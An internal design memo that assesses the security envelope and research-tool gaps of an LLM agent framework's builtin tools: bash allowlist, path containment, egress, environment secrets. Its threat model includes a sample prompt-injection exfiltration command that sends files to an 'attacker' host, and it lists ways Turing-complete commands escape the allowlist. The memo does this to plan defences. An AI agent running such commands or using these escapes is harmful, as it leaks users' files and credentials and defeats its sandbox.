# Builtin Tools — Security and Research Coverage Memo

Last updated: 2026-05-19.
Status: Assessment only. No implementation is committed by this document.
Related: `docs/builtin-tools-restructure-plan.md`,
`docs/deferred-refactor-tracker-memo.md` § "PR C - Builtin Tools
Restructure".

This memo records, as of the PR C-6 closeout, two things that fell out
of scope of the restructure but matter before Dango formally adopts
research-class or autonomous-experiment skills:

1. The realistic security envelope of the current builtin tool set.
2. The coverage gap between today's tools and the workflows a research
   or autonomous-experiment skill typically needs.

It is written so a future PR proposing research-skill support can pick
it up without rereading this conversation. Nothing here proposes new
tools to ship today; each candidate is a hook for a separately scoped
PR.

## 0. Triage decisions (2026-05-19, revised)

This section is the controlling triage. Read it before any later
section; the subsections that follow are inventory and reference, not
standalone decisions.

### 0.1 Tool vs skill — the core distinction

The decision criterion for *every* capability in this memo is whether
it belongs as a tool, as a skill, or outside dango entirely.

- **Tool.** A single-shot function call. No state across invocations.
  Predictable execution path. Caller bears the cognitive load of when
  and how to chain it.
- **Skill.** Instructions + an executor AI that holds context across the
  lifetime of a node, observes upstream handoffs and the current task,
  and dynamically adjusts its execution. Skills can route through the
  orchestrator and consume their own turn.

Either form can wrap the other (a skill can be implemented as a
glorified tool with one stage; a tool can be re-implemented as a
single-turn skill at the cost of extra tokens and an extra orchestrator
hop). Choose based on three signals:

1. **Complexity.** If the work needs case-by-case judgement on input
   shape, prefer skill. If the work is mechanical and the contract is
   small, prefer tool.
2. **Statefulness.** If the work benefits from carrying context across
   multiple sub-steps, prefer skill. If each call is independent,
   prefer tool.
3. **Generality.** If every skill might want it, prefer tool. If only
   a small set of domain-specific tasks need it, prefer skill.

This same rubric is reused below as the default-vs-`BuiltinExtras` rule
(§ 0.4) and as the tool-vs-skill assignment for § 3 candidates.

### 0.2 Tool / skill ecosystem architecture

Dango is a Go package. The cmd or app embedding it owns the runtime
shape. Tools and skills available to a skill's LLM come from four
distinct sources:

1. **Go builtin tools.** Compiled into the dango package. The default
   set plus `BuiltinExtras`. PR C established the current shape.
2. **External builtin tools.** Imported by the app/cmd at build time
   alongside dango. Same lifecycle as Go builtins but live in the
   app/cmd codebase, not in dango itself.
3. **MCP tools.** Loaded by the app/cmd at startup from a config of
   MCP servers (stdio or HTTP). Cover narrow, well-defined capabilities
   that the MCP ecosystem already publishes (`web_search`, document
   loaders, etc.).
4. **Packaged skills.** Skills the app/cmd ships alongside its own
   skills, running in an app/cmd-managed venv or node environment.
   These cover work that needs a Python or node ecosystem
   (`pdf_extractor`, dataset loaders, notebook execution).

The first three are *common tools* visible to every skill's LLM. The
fourth is a *skill* the orchestrator can route to, and runs in its
own runtime that the app/cmd has prepared. End users embedding dango
focus on writing their own domain skills; the four-class infrastructure
is provided by the app/cmd.

### 0.3 Triage by section

- **Security envelope (§ 2) — partially deferred.** The structural
  hardening (env scrubbing UX, egress enforcement defaults, resource
  caps, write-target inspection) is deferred until the app/cmd
  **alpha-version trigger** described in § 0.5. Several
  pre-hooks land now under Track F to avoid retrofitting later; see
  § 2.4.
- **Research / autonomous-experiment capabilities (§ 3.1–§ 3.3) —
  served by the four-class architecture above, not Go builtins.** Most
  items are already covered by published MCP servers (web search, paper
  fetch, citation handling) and should not be reimplemented. The
  ecosystem items that need a Python / node runtime
  (`pdf_extractor`, `notebook_run`, `table_preview`, dataset fetching)
  are skills packaged by the app/cmd, not dango Go builtins. Items
  that would need their own abstract interface without a concrete user
  (e.g., `experiment_log`) are deferred until a real use case shows up.
- **Go-resident near-term builtin work — Track D.** § 3.4 and § 3.5
  remain in Go because they are OS-resident, workspace-bounded, and
  free of language-runtime dependencies. Scheduled under
  `docs/builtin-tools-near-term-plan.md`.
- **MCP support — Track E (new).** First-class MCP client wiring is on
  the near-term track so the four-class architecture is real, not
  aspirational. See the near-term plan.
- **Security pre-hooks + instrumentation — Track F (new).** The
  near-term-doable mitigations (URL-allowlist opt-in interface,
  `trusted_input` flag, audit-tagging the existing tool-call stream
  events, trace-data analysis utility) land now so the post-alpha
  security phase has hooks and evidence to build on. See the near-term
  plan.

### 0.4 Default vs `BuiltinExtras` rubric

Apply the tool-vs-skill criteria (§ 0.1) within the tool tier:

- **Default builtin set** when the capability is single-shot,
  stateless, predictable, and *general* — every skill plausibly
  benefits.
- **`BuiltinExtras`** when the capability is narrower (single-domain,
  niche workflow), or has side effects most skills do not want by
  default (high-volume output, host-environment probing). The skill
  author opts in.
- **Not a builtin** when the capability needs an external runtime or
  ongoing state — those become external builtins, MCP tools, or
  packaged skills.

This rubric replaces the older "risk vs generality" shorthand; risk is
absorbed into structural-hardening work scheduled for after the alpha
trigger.

### 0.5 Concrete trigger for the structural-hardening phase

The structural security work in § 2.3 opens when **the first
app/cmd alpha is feature-complete and has been internally exercised
end-to-end at least once**. "Feature-complete" here means: the app/cmd
can launch, load builtin / external builtin / MCP / packaged-skill
tool sources, and run a multi-stage orchestrator-driven task to
completion against real data. Until that trigger event fires, only the
Track F pre-hooks in § 2.4 apply; the rest stays deferred.

## 1. Inventory snapshot

Default (always on): `bash`, `read_file`, `write_file`, `edit_file`,
`delete_file`, `move_file`, `grep`, `pipeline_search_replace`,
`file_excerpt`.

Opt-in via `BuiltinExtras`: `list_dir`, `pwd`.

Bash allowlist (`internal/llm/internal/builtin/allowlist.go`,
`defaultAllowlist`) covers ~70 binaries spanning read-only text tools,
archive tools, language toolchains, package managers, and the two
network fetchers `curl` and `wget`. Destructive tools (`rm`, `mv`,
`dd`, `sudo`) are intentionally absent; filesystem mutation is funnelled
through the Go tools.

## 2. Security envelope

**Triage:** Structural hardening is deferred to the post-alpha trigger
(§ 0.5). The pre-hooks in § 2.4 land now under Track F; everything else
in § 2.3 stays deferred. § 2.1 and § 2.2 are reference inventory.

### 2.1 What is actually enforced

- **Path containment for Go tools.** Every Go-implemented tool routes
  paths through `workspace.ResolvePath`, which rejects paths outside the
  temp playground, the skill source root, and any user-added accessible
  directory. Symlink escapes through existing prefixes are rejected by
  `resolvePathExistingPrefix`.
- **Bash redirection containment.** `checkRedirections` (PR C-1)
  statically rejects dynamic redirect targets and absolute targets
  outside the workspace. Heredocs and here-strings are accepted because
  they do not touch host paths.
- **Bash allowlist on simple-command heads.** `checkAllowlist` walks the
  parsed AST and rejects unknown command heads, including inside
  pipelines, subshells, and command substitutions.
- **Output and runtime bounds.** Bash output is capped at 16 KiB by
  default; `output_file` redirects large output into a workspace-bounded
  file. Default timeout is 60 s; `long_running: true` defers to parent
  context cancellation.

### 2.2 What is not enforced (known and accepted today)

- **Argument-level write targets.** `tee /etc/foo`, `cp src /etc/foo`,
  `dd of=/etc/foo`, `python -c "open('/etc/foo','w')..."`, and similar
  are not inspected. Bash and `system_instructions.md` already document
  this. Skills that need workspace containment must route writes through
  redirections or the Go file tools.
- **Allowlist is per-process-head, not per-effective-action.** Allowed
  Turing-complete heads (`python3`, `node`, `bash -c "..."`, `sh -c`,
  `make`, `xargs <cmd>`, `find ... -exec ...`, `awk 'BEGIN{system(...)}'`)
  can execute arbitrary code that the allowlist never inspects. The
  allowlist is a forcing function for tool selection, not a sandbox.
- **Network egress is unrestricted.** `curl` and `wget` are in the
  default allowlist with no URL allowlist or rate limit. Package
  managers (`pip`, `npm`, `pnpm`, `cargo`, `uv`, `conda`, `pixi`, …)
  pull and execute arbitrary code from package indexes on install.
- **Process environment is inherited.** Bash inherits the parent
  process's full environment, so any secrets exported to the host shell
  (API keys, SSH agent sockets, cloud credentials) are visible to the
  model. There is no env filtering or per-skill secret broker.
- **No resource caps beyond timeout.** No CPU, memory, file-descriptor,
  process-count, or disk-quota limits. Long-running bash defers to the
  parent context only.
- **No audit log dedicated to tool calls.** The stream-event log
  captures `llm.tool_call.started`, which is enough for trace analysis
  (see PR C-3), but it is not designed as a security audit trail.

### 2.3 Threat-model implications

The current envelope is appropriate for **trusted local developer use**:
a human is running the example, the workspace is disposable, and
network egress / package install is desirable. It is **not** appropriate
for:

- Untrusted task input where prompt injection could cause the model to
  exfiltrate host files via `curl --data-binary @/path http://attacker`.
- Multi-tenant or shared-host execution.
- Autonomous experiment loops that may run unattended for hours and
  accumulate state, install dependencies, and contact external services
  without human review of each step.

Structural mitigations to consider after the alpha trigger (each its
own PR; do not start before § 0.5 fires):

- **Env scrubbing UX.** A `WithBashEnv(...)` filter that scrubs the
  inherited environment by default and lets skills opt into specific
  keys. Deferred because a blanket deny on `*_TOKEN` / `*_KEY` /
  `*_SECRET` breaks legitimate API-calling skills without an
  interactive opt-in path, and the interactive design is not yet
  scoped.
- **Egress enforcement default.** Flip the URL allowlist from
  opt-in (Track F, see § 2.4) to enforced-by-default for autonomous or
  untrusted-input runs.
- **Argument-level write-target inspection.** Extend the AST walker
  used by `checkRedirections` to also inspect the small set of allowed
  commands that take a write path (`tee`, `cp`, `dd`, redirected
  `awk`/`sed`).
- **"No network" config preset.** Drop `curl`/`wget` and package
  installers from the allowlist when the skill does not need them.
- **Resource caps.** RLIMIT_AS, RLIMIT_CPU, RLIMIT_NOFILE on the bash
  child process.

### 2.4 Near-term pre-hooks (Track F)

These mitigations land now under Track F because each one is either a
zero-cost interface stub or a self-contained instrumentation
improvement. None of them changes default behavior; they exist so the
post-alpha structural work has stable hooks and real data to lean on.

- **`WithBashURLAllowlist([]string)` opt-in.** Adds the configuration
  surface and the curl / wget URL extraction logic. Default empty
  list means "no restriction" so current runs are not affected;
  callers that set a non-empty list get enforcement immediately. See
  Track F PR F-1 in `docs/builtin-tools-near-term-plan.md`.
- **`TrustedInput bool` flag on `SkillConfig`.** A declarative hint
  that the skill's input may come from an untrusted source. Carries no
  behavior gate today, but every later mitigation can consult it
  without breaking-change risk on the config surface. Track F PR F-2.
- **Audit-tagging the existing tool-call stream events.** Mark
  `llm.tool_call.started` (and `.completed`) as the canonical audit
  source via an explicit `category: "audit"` (or equivalent) tag and
  document the field set the audit phase will rely on. No new event
  pipeline. Track F PR F-3.
- **Trace-data analysis utility.** Promote the PR C-3 manual analysis
  to a small Go program under `tools/`. Each example run can produce
  bash command-head distribution, captured inner-command bodies of
  Turing-complete heads (`python -c`, `bash -c`, `xargs <cmd>`,
  `make`, `awk` system-calls), and a tally per skill class. The
  structural-hardening phase consumes this dataset directly. Track F
  PR F-4.

Anything not listed in § 2.4 stays in § 2.3 and waits for the trigger.

## 3. Coverage gap for research / autonomous experiment skills

The PR C restructure tuned the default set for general code-and-data
work. Research and autonomous-experiment workflows pull in several
verticals that the current set covers only through ad-hoc bash. The
gaps below are grouped by workflow stage; each one is a candidate, not a
commitment.

**Triage by track.** § 3.4 and § 3.5 stay on the **Go builtin near-term
track (Track D)** in `docs/builtin-tools-near-term-plan.md`. § 3.1 and
§ 3.2 are mostly covered by the published MCP ecosystem (`web_search`,
paper fetch, etc.); the gap is wiring MCP up, which is **Track E** on
the same near-term plan, and packaging Python skills (PDF, tabular,
notebook) which is owned by the embedding app/cmd. § 3.3 is partially
deferred: items without a concrete use case (`experiment_log`) wait
for a real workload, and cluster / job-control items wait for trace
evidence. Each subsection below repeats its track tag for clarity.

### 3.1 Source discovery and literature

**Track:** MCP (Track E) for `web_search` and paper fetch; app/cmd
packaged skill for PDF / HTML extraction; deferred for citation
formatting until a concrete need surfaces. Rationale: most published
MCP servers already return AI-friendly curated results rather than raw
search-engine pages, response parsing is more ergonomic in Python, and
documented Python SDKs exist for Tavily / arXiv / Semantic Scholar. We
should consume those ecosystems rather than reimplement them.

- **Web search.** No structured `web_search` tool. Skills that need to
  locate papers, datasets, or documentation can only `curl` known URLs.
  A `web_search` tool that returns ranked titles + snippets + URLs would
  remove a Turing-complete escape (`python3 -c "...requests..."`) from
  the hot path.
- **Authoritative paper fetch.** `arxiv_fetch` /
  `semantic_scholar_fetch` style wrappers that return metadata + PDF
  path inside the workspace. Currently done via bash + `curl` + manual
  HTML scraping.
- **HTML / PDF extraction.** `pdf_extract_text`, `pdf_extract_tables`,
  `html_to_markdown`. Done today via `python3 + pdfminer/pymupdf`, which
  forces every research skill to redeclare an extraction script.
- **Citation handling.** `citation_format` (BibTeX/CSL-JSON in, formatted
  string out). Low priority; mention only because every literature task
  re-implements it.

### 3.2 Dataset and environment management

**Track:** app/cmd packaged skills (pandas / pyarrow / nbconvert) plus
optional MCP servers for dataset fetch where they exist. Dango itself
should not own these; the app/cmd ships them as packaged skills with
their own Python environment per § 0.2.

- **Dataset fetch with caching.** `dataset_fetch` (URL or
  Kaggle/HuggingFace dataset id, returns path inside workspace, caches
  across runs in a user-added accessible dir). Replaces ad-hoc
  `curl | tar -xz` chains.
- **Tabular preview / schema sniff.** `table_preview` (CSV/Parquet/JSON
  Lines path → first N rows + inferred schema + null counts). Today
  this is bash + `python3 -c "import pandas..."` boilerplate that costs
  tokens on every research turn.
- **Notebook execution.** `notebook_run` (path + parameters →
  executed-notebook artifact path). `jupyter` is on the allowlist but
  the model has to remember the `nbconvert --execute` incantation each
  time.

### 3.3 Experiment lifecycle

**Track:** deferred until concrete usage exists. Designing
`experiment_log` as an abstract interface without a real first user
risks shipping an API that does not match the eventual usage; wait
for a concrete workload to drive the shape. The mlflow / wandb /
sbatch / kubectl items are app/cmd packaged skills when they arrive.
Generic background-job control (`kill`, `ps`, `pgrep`, `timeout`)
re-enters the Go builtin track only if PR C-3-style trace evidence
shows a recurring bash pain point; flag it then, not now.

- **Experiment logger.** `experiment_log` (write a structured row
  describing run config, metrics, artifact paths). Right now the
  pattern is hand-rolled JSONL files in `memo/` per skill.
- **Background job control.** Bash supports `long_running: true` but
  there is no listing/killing of running jobs and `kill`, `ps`,
  `pgrep`, `pkill`, `nohup`, `timeout` are not on the allowlist. For
  autonomous experiments that fork training jobs and need to abort on
  early-stopping signals, this is the biggest concrete gap.
- **Resource probe.** `system_probe` (available CPU, RAM, GPU
  visibility). Today via `nvidia-smi`/`free -h` which are not on the
  allowlist either. Useful for deciding batch sizes before launching a
  training run.
- **Cluster submission.** `slurm_submit` / `slurm_status`,
  `ssh_run`. Out of scope for the first research-skill PR but should
  be noted: today bash cannot reach `sbatch`/`squeue`/`ssh` because
  none are on the allowlist.

### 3.4 Version control and history

**Track:** Go builtin (Track D). Scheduled under
`docs/builtin-tools-near-term-plan.md`.

- **Git.** Not on the default allowlist. Research skills that ingest
  existing repos (read commit history, diff between revisions, blame a
  line) currently cannot. Adding `git` to the allowlist is the simplest
  patch; a `git_log` / `git_diff` wrapper is the token-frugal version
  if traces justify it under the PR C-3 rule.

### 3.5 Structured artifact handling

**Track:** Go builtin (Track D). Scheduled under
`docs/builtin-tools-near-term-plan.md`.

- **Artifact catalog.** A first-class read of the per-task
  `downstream/artifacts/` directory + the handoff front-matter
  `artifacts:` list, returning a typed summary instead of forcing the
  model to re-grep handoff YAML.
- **JSON/YAML schema preview.** `jq` and `yq` are on the allowlist, so
  this is reachable, but a `structured_preview` wrapper that returns
  top-level keys plus value-type counts is cheaper for autonomous
  loops than a fresh `jq` invocation each turn.

## 4. Suggested sequencing

Updated 2026-05-19 to reflect the § 0 triage.

Near-term tracks (all scheduled under
`docs/builtin-tools-near-term-plan.md`, can run in parallel):

1. **Track D — VCS and artifact handling.** Go builtin work for § 3.4
   and § 3.5. Small, self-contained PRs.
2. **Track E — MCP support.** Wire dango as an MCP client so the four-
   class architecture in § 0.2 becomes real. Unblocks the § 3.1
   `web_search` / paper-fetch capabilities by consuming published MCP
   servers.
3. **Track F — Security pre-hooks and instrumentation.** The four
   pre-hooks in § 2.4: `WithBashURLAllowlist` opt-in, `TrustedInput`
   flag, audit tagging on tool-call events, trace-analysis utility.

App/cmd cycle (separate plan, not owned by this memo):

4. **App/cmd alpha.** Designs the packaged-skill loader, the MCP
   server config surface, and ships the first dango-official packaged
   skills (PDF / tabular / notebook). The completion of this milestone
   is the trigger for § 0.5.

Post-alpha:

5. **Structural security hardening.** Open the § 2.3 mitigations one
   PR at a time, leaning on the audit data and trace dataset that
   Track F produced.

## 5. Out of scope of this memo

- No new tool is being added by PR C-6 or by this memo.
- No allowlist change is being made; the listed candidates are pointers,
  not decisions. The near-term plan owns the actual PR specs for
  Tracks D, E, and F.
- No commitment to a specific app/cmd design. That belongs with the
  app/cmd cycle when packaged-skill selection and MCP server config
  shape are scoped.
- No structural security mitigation is being scheduled yet; that phase
  begins after the § 0.5 alpha trigger and is tracked separately when
  it opens. The Track F pre-hooks are *not* structural mitigations —
  they are stable hooks the structural phase will lean on.
